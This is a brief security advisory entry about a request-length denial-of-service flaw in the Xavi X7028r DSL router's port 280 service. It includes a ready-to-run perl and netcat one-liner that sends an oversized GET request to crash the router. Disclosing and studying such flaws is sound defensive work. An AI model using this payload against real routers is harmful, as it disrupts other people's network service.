source: https://www.securityfocus.com/bid/8252/info

A problem has been reported in the handling of requests of excessive length placed to the service on port 280 by the Xavi X7028r DSL router. This may allow an attacker to crash a vulnerable router.

perl -e 'print "GET /"."A"x1008;print "\nHost:www.example.com:280\n\n\n\n\n"' | netcat -v -n www.example.com 80